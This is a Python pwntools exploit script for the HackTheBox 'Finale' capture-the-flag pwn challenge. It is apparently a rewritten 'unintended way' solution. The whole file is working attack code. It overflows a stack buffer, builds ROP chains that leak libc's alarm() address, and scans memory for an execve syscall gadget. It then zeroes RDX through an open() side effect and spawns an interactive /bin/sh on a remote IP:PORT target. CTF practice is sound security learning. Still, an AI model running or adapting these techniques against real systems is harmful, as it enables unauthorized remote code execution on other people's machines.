#########################################################################################
# exploit.py
#   Exploit that solves HTB's Finale pwn challenge using an unintended way.
#   This version has been re-written and updated for 'The CreativePwning Project'
#   2024 by Socialkas (@Disbauxes)
#
#   NOTES
#       This exploit leaks the address of libc6's alarm() function and then
#       it dumps all the opcodes from alarm() to offsetAddr in order to search
#       for execve()'s opcodes offset:
#
#           b83b000000 mov eax,0x3b
#           0f05       syscall
#           c3         ret
#
#       Because the server is running a custom libc6 library, we cannot use
#       any traditional way of computing libc6's base address and the address of
#       execve(), system(), "/bin/sh" etc. But we can clearly see that alarm()
#       is very close to execve():
#
#           $1 = {<text variable, no debug info>} 0x7ffff7e7e0f0 <execve>
#           $2 = {<text variable, no debug info>} 0x7ffff7e7d5b0 <alarm>
#           p/x 0x7ffff7e7e0f0 - 0x7ffff7e7d5b0:    0xb40
#
#       So by dumping around 3000 bytes of instructions, we can get the
#       offset from alarm() to the desired opcodes in les than 2 minutes (remotely)
#       Once we have this offset, we use it in order to call execve() in a simple
#       ROP-chain.
#
#       Run against the live instance:
#
#       [!] Dumping bytes from 0x7fe0ef09cf4c ... 
#       [!] Dumping bytes from 0x7fe0ef09cf5f ... 
#       [!] Dumping bytes from 0x7fe0ef09cf60 ... 
#       [!] mov eax,0x3b found at 0x7fe0ef09cf60, dumped bytes 2503
#
#       The offset is 0xce4
#       python3 HTB-finale-2024.py REMOTE OFFSET=3300 [REMOTE TARGET=IP:PORT]
#
#   USAGE
#           python3 exploit.py [REMOTE TARGET=IP:PORT]
#
#   CHALLENGE
#       HackTheBox Track "HackTheBoo"
#       https://app.hackthebox.com/challenges/405
#       Intended way: https://7rocky.github.io/en/ctf/htb-challenges/pwn/finale/
#########################################################################################
from pwn import *

# Challenge:
exe = "./finale"
binary = ELF(exe)

# The password we need to send in order to reach the vulnerable function finale():
password = b's34s0nf1n4l3b00'

# ROP gadgets:
pop_rdi =   0x4012d6
pop_rsi =   0x4012d8

# libc6@plt functions:

# For our kind of attack, we can see that alarm() is very close to execve:
#   $1 = {<text variable, no debug info>} 0x7ffff7e7e0f0 <execve>
#   $2 = {<text variable, no debug info>} 0x7ffff7e7d5b0 <alarm
#   p/x 0x7ffff7e7e0f0 - 0x7ffff7e7d5b0:    0xb40
# So we will use this function in order to reach for execve:
_alarm_got  =   0x403fa0

# We show some basic information about the ROP gadgets will be using:
info("ROP gadgets at: pop_rdi_ret=0x%2x," \
                      "pop_rsi_ret=0x%2x," \
                      % (pop_rdi,pop_rsi))

# How many bytes of padding before reaching RBP:
padding = 0x40

################################################################################
#   ropDumpMemory(addr):
#       Constructs and returns a ROP-chain that leaks what's at address "addr"
#       Returns back to main
################################################################################
def ropDumpMemory(addr):

    rop     =   b''     
    rop     +=  p64(pop_rdi)
    rop     +=  p64(addr)                           # rdi <- addr
    rop     +=  p64(binary.symbols["plt.puts"])     # puts(*addr)
    rop     +=  p64(binary.symbols["main"])         # main();

    return rop

def dumpBytes(start_addr,RBP,r):

    # We are looking for "mov eax,0x3b":
    searchFor   =   b'\x3b\xb8'
    found   = False
    addr    = start_addr
    dumped  =   b''     # dumped bytes so far
    new_buffer  =   0x0

    while found == False:

        warning("Dumping bytes from 0x%02x ... " % addr)

        # We try dumping some bytes until puts() stops due to a NULL-byte:
        r.sendlineafter(b"phrase: ",password)
        new_buffer = getBuffer()
        r.sendlineafter(b'year: ',b'A'*padding + p64(RBP) + ropDumpMemory(addr))

		# We parse everything until reaching the leaked value:
        r.recvuntil(b"you!")
        r.recvline()
        r.recvline()

		# Here are the bytes until reaching a NULL-byte:
        data = r.recvline()[::-1]

        # So we know that, at least, len(data) from addr are not null. If len(data)
        # is 0, means a NULL-byte. In this case, we can increase the address by 1
        # and add this NULL byte to the dumped bytes:
        if len(data) > 0:
            dumped  +=  data
            # Have we found it? We do not need to do this login when \x00:
            if dumped.find(searchFor) != -1:
                warning("mov eax,0x3b found at 0x%02x, dumped bytes %d" % ( addr, len(dumped)))
                return addr
            addr    +=  len(data)
        else:
            addr    +=  1
            dumped  +=  b'\x00'


#########################################################################################
# getBuffer():
#   Returns the stack address given by the program
#########################################################################################
def getBuffer():
    buf_addr = 0x0
    r.recvline()
    buf_addr = int(r.recvline().decode('ascii').split(':')[2].strip().replace("[","").replace("]",""),16)
    warning("Leaked &buff = 0x%2x " % buf_addr)
    return buf_addr

if args.REMOTE:
    # We will be connecting to the remote instance:
    r = remote(args.TARGET.split(':')[0],int(args.TARGET.split(':')[1]))
else:
    # We will be using a local process in our machine:
    r = process(binary.path)

# Default offset from alarm_addr to start dumping bytes from. You can override
# this value with OFFSET=n
if args.OFFSET:
    alarm_offt  =   int(args.OFFSET)
else:
    alarm_offt  =   3200
warning("We will start dumping bytes at offset: %d" % alarm_offt)

# We send the secret password to the program:
r.sendlineafter(b"phrase: ",password)

buf_addr = getBuffer()

# First thing is to leak the address of the libc6's function alarm() using its
# got entry and disable alarm:
#   [0x403fa0] alarm@GLIBC_2.2.5  â†’  0x7ffff7e7d5b0
r.sendlineafter(b'year: ', b'A'*padding + p64(buf_addr) + ropDumpMemory(binary.symbols["got.alarm"]))
r.recvuntil(b"you!")
r.recvline()
r.recvline()
alarm = int(r.recvline()[:-1][::-1].hex(),16)
warning("Libc6's alarm() at 0x%2x " % alarm)

# We look for execve() from alarm+offset:
execve_addr =   dumpBytes(alarm+alarm_offt,buf_addr,r)

# We send our payload and we gain a remote shell:
info("Sending ROP-chain to gain a shell...")
r.sendlineafter(b"phrase: ",password)
# Let's grab our new buffer address: there we will have our command:
buf_addr = getBuffer()
rbp  = buf_addr

# The command we want to run:
command = b'/bin/sh\x00'
payload = command

# The padding taking into account our command:
payload += b'A'*(padding-len(command))
payload += p64(rbp)

# We need to set RDX to 0, it's still 0x54 (otherwise, our ROP will fail).
# We do not have any xor edx,edx or mov edx,0 or somehing similar, but we
# can call open() and it sets RDX = 0, so there we go (we have described this
# technique in Chapter1, "libc6 function side-effects!):
payload += p64(pop_rdi)
payload += p64(buf_addr)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(binary.symbols["open"])      # open('/bin/sh',0); -> RDX = 0

# The last part of our ROP-chain will call execve():
execve  =   p64(pop_rdi)
execve +=   p64(buf_addr)
execve +=   p64(pop_rsi)
execve +=   p64(0x0)
execve +=   p64(0x040101a)
# We jump to execve address now (mov eax, 0x3b; syscall):
execve +=   p64(execve_addr)                # execve("/bin/sh\x00",NULL,NULL);
payload += execve

r.sendlineafter(b'year: ',payload)
r.clean()
# We gain a remote shell:
r.interactive()
r.close()
